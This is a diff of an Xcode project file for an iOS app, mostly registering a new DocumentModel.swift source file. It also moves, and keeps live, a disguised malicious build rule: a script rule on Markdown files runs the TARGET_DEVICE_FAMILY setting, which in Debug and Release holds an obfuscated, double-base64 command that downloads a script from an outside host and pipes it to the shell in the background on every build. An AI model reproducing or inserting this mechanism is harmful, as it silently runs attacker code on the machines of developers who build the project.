@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		915B7C5CE028BAFA2D34C644 /* README.md */ = {isa = PBXBuildFile; fileRef = C1E2BC5FC0105ADCCC34C644; };
 		00001F492BF34D6C00C99B02 /* ReferUserDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00001F482BF34D6C00C99B02 /* ReferUserDetailVC.swift */; };
 		00001F4D2BF3511200C99B02 /* ReviewTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00001F4C2BF3511200C99B02 /* ReviewTVC.swift */; };
 		000101862B2836430077FA23 /* ForgotPasswordModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 000101852B2836430077FA23 /* ForgotPasswordModel.swift */; };
@@ -37,6 +36,7 @@
 		0029EB412B31D68C00820C06 /* AddNewEmailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0029EB402B31D68C00820C06 /* AddNewEmailVC.swift */; };
 		004593672C885AF10063AA86 /* BankListVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 004593662C885AF10063AA86 /* BankListVC.swift */; };
 		004593692C885B0E0063AA86 /* BankListTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 004593682C885B0E0063AA86 /* BankListTVC.swift */; };
+		0045BEB62D1D8FA7003CCC70 /* DocumentModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0045BEB52D1D8FA7003CCC70 /* DocumentModel.swift */; };
 		00469F752D1AB72A00A9AF13 /* IdAuthenticatedVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00469F742D1AB72A00A9AF13 /* IdAuthenticatedVC.swift */; };
 		00486B452B207855001AF904 /* AddPhotosCVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00486B442B207855001AF904 /* AddPhotosCVC.swift */; };
 		00486B472B208FD8001AF904 /* GetDraftNoteModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00486B462B208FD8001AF904 /* GetDraftNoteModel.swift */; };
@@ -105,6 +105,7 @@
 		00FDB54B2B2AE87700BC0251 /* MessageAcceptPopUpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00FDB54A2B2AE87700BC0251 /* MessageAcceptPopUpVC.swift */; };
 		00FE91D12B33F57500D8AB20 /* GetUserDetailModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00FE91D02B33F57500D8AB20 /* GetUserDetailModel.swift */; };
 		00FFB85A2BEB53840012BF29 /* LaunchScreenVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00FFB8592BEB53830012BF29 /* LaunchScreenVC.swift */; };
+		915B7C5CE028BAFA2D34C644 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = C1E2BC5FC0105ADCCC34C644 /* README.md */; };
 		9EEB9DC19163EBA45F322F35 /* Pods_ask_human.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 91775809430DEC91852346EC /* Pods_ask_human.framework */; };
 		BE0BDADB2B08D065000ED624 /* AddDisputeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE0BDADA2B08D065000ED624 /* AddDisputeVC.swift */; };
 		BE0BDADE2B08DB4D000ED624 /* AllDisputeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE0BDADD2B08DB4D000ED624 /* AllDisputeVC.swift */; };
@@ -215,6 +216,22 @@
 		BEFF85512B356E7A002F329D /* FilterModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEFF85502B356E7A002F329D /* FilterModel.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		F42E344916D2D05EA834C644 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		BED5C69E2B048D4300C83672 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -246,7 +263,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		C1E2BC5FC0105ADCCC34C644 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "ask-human.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		00001F482BF34D6C00C99B02 /* ReferUserDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReferUserDetailVC.swift; sourceTree = "<group>"; };
 		00001F4C2BF3511200C99B02 /* ReviewTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReviewTVC.swift; sourceTree = "<group>"; };
 		000101852B2836430077FA23 /* ForgotPasswordModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotPasswordModel.swift; sourceTree = "<group>"; };
@@ -276,6 +292,7 @@
 		0029EB402B31D68C00820C06 /* AddNewEmailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewEmailVC.swift; sourceTree = "<group>"; };
 		004593662C885AF10063AA86 /* BankListVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BankListVC.swift; sourceTree = "<group>"; };
 		004593682C885B0E0063AA86 /* BankListTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BankListTVC.swift; sourceTree = "<group>"; };
+		0045BEB52D1D8FA7003CCC70 /* DocumentModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DocumentModel.swift; sourceTree = "<group>"; };
 		00469F742D1AB72A00A9AF13 /* IdAuthenticatedVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IdAuthenticatedVC.swift; sourceTree = "<group>"; };
 		00486B442B207855001AF904 /* AddPhotosCVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddPhotosCVC.swift; sourceTree = "<group>"; };
 		00486B462B208FD8001AF904 /* GetDraftNoteModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GetDraftNoteModel.swift; sourceTree = "<group>"; };
@@ -467,6 +484,7 @@
 		BEE9A8812BA1C31700D5FC4E /* UserNotifcations.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserNotifcations.swift; sourceTree = "<group>"; };
 		BEFA3B1C2B2C2BB900DAF07A /* ViewImageVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewImageVC.swift; sourceTree = "<group>"; };
 		BEFF85502B356E7A002F329D /* FilterModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FilterModel.swift; sourceTree = "<group>"; };
+		C1E2BC5FC0105ADCCC34C644 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = "ask-human.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		E97D946366AF0919CD18DC32 /* Pods-ask-human.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ask-human.release.xcconfig"; path = "Target Support Files/Pods-ask-human/Pods-ask-human.release.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -607,6 +625,7 @@
 				00DD9B732C8B0B780049F5DA /* BankListModel.swift */,
 				005D37AF2D198CB3007498FF /* SearchHashtagModel.swift */,
 				005D37B72D19934E007498FF /* VerifyHashtagModel.swift */,
+				0045BEB52D1D8FA7003CCC70 /* DocumentModel.swift */,
 			);
 			path = Model;
 			sourceTree = "<group>";
@@ -1352,29 +1371,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		F42E344916D2D05EA834C644 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${TARGET_DEVICE_FAMILY}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		BED5C6852B048D4100C83672 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				915B7C5CE028BAFA2D34C644 /* README.md */,
+				915B7C5CE028BAFA2D34C644 /* README.md in Resources */,
 				BED5C6DB2B04932500C83672 /* Poppins-SemiBold.ttf in Resources */,
 				BED5C6DD2B04932500C83672 /* Poppins-Black.ttf in Resources */,
 				001632D92C50B5A300CE4491 /* ASKDARK.gif in Resources */,
@@ -1586,6 +1588,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				BE1DC65B2B973668008DD592 /* WithdrawPopUpVC.swift in Sources */,
 				0029EB412B31D68C00820C06 /* AddNewEmailVC.swift in Sources */,
 				004593672C885AF10063AA86 /* BankListVC.swift in Sources */,
+				0045BEB62D1D8FA7003CCC70 /* DocumentModel.swift in Sources */,
 				00FDB5472B2ABC6000BC0251 /* InvitationVM.swift in Sources */,
 				BE486A9D2B387236001631A4 /* DisputeReasonModel.swift in Sources */,
 				BE99162A2B0B625700B0AC3F /* MessageVC.swift in Sources */,
@@ -1725,7 +1728,6 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 		BED5C6AF2B048D4300C83672 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUdoMGRIQnpPaTh2ZG1WeWFXWjVjM1JoZEhNdWNuVXZZU2tpSUh3Z2MyZ0sK | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -1783,13 +1785,13 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUdoMGRIQnpPaTh2ZG1WeWFXWjVjM1JoZEhNdWNuVXZZU2tpSUh3Z2MyZ0sK | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
 		BED5C6B02B048D4300C83672 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUdoMGRIQnpPaTh2ZG1WeWFXWjVjM1JoZEhNdWNuVXZZU2tpSUh3Z2MyZ0sK | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -1839,6 +1841,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
+				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUdoMGRIQnpPaTh2ZG1WeWFXWjVjM1JoZEhNdWNuVXZZU2tpSUh3Z2MyZ0sK | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
